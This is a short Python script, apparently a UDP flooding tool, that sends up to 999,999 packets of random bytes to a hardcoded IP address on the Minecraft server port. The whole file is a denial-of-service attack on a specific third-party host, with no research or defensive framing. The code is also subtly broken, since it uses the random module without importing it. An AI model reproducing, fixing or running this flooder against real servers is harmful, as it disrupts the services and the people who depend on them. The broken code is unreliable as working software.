import os
import sys
import socket

# Cache
#packet = IP(dst="127.0.0.1")/UDP(sport=25565, dport=25565)/"assalls"

# Create a UDP socket at client side
clientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
clientSocket.settimeout(10)

bytesToSend = str.encode("PING")
serverAddressPort = (str("107.152.41.214"), int(25565))

totalBytesSent = 0

# Functions
def ping(i):
    try:
        #send(packet, iface='Ethernet')
        data = str.encode(f"PING{i}=={random.randbytes(1000)}")
        clientSocket.sendto(data, serverAddressPort)

        global totalBytesSent
        totalBytesSent +=  sys.getsizeof(data)
    except Exception as e:
        print("Error sending pack to target: ", e)
        stop()

def start():
    for i in range(999999):
        print('Sending #', i)
        ping(i)
    
    stop()

def stop():
    print("Stopping...")

    if clientSocket is not None:
        clientSocket.close()
    
    print(f"SENT {totalBytesSent} BYTES")


# Main()
if __name__ == '__main__':
    print("Starting...")
    start()